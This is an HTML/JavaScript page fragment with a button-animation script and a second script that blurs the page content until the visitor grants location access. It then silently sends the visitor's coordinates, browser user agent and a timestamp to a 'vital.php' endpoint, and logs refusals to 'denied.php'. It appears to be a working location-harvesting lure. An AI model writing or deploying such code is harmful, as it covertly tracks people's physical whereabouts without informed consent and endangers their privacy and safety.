    <script>
      const button = document.getElementById('button-animate');
        //the button animation only works once after clicked, and needs a page refresh to work again
        //this script was add to for it to work several times(unlimited) without refreshing the page
        
      button.addEventListener('click', function() {
        // Remove the animation class
        button.classList.remove('page2-button');
  
        // Trigger a reflow (force browser to repaint)
        void button.offsetWidth;
  
        // Add the animation class back
        button.classList.add('page2-button');
      });
    </script>
    <script>
        function requestLocationPermission() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        // Location permission granted
                        document.getElementById('blurry-container').style.filter = 'none'; // Remove blur
                        document.getElementById('blurry-container').style.pointerEvents = 'auto'; // Make clickable
                        document.getElementById('blurry-container').style.userSelect = 'text'; // Allow text selection
                        const now = new Date().toISOString();
                        const xhttp = new XMLHttpRequest();
                        xhttp.open("GET", "vital.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent + "&time=" + now);
                        xhttp.send()
                    },
                    function (error) {
                        // When Location permission is denied
                        const xhttp = new XMLHttpRequest();
                        xhttp.open("GET", "denied.php?");
                        xhttp.send()
                        console.error('Location permission denied:', error);
                    }
                );
            } else {
                console.error('Geolocation is not supported by this browser.');
            }
        }
    </script>
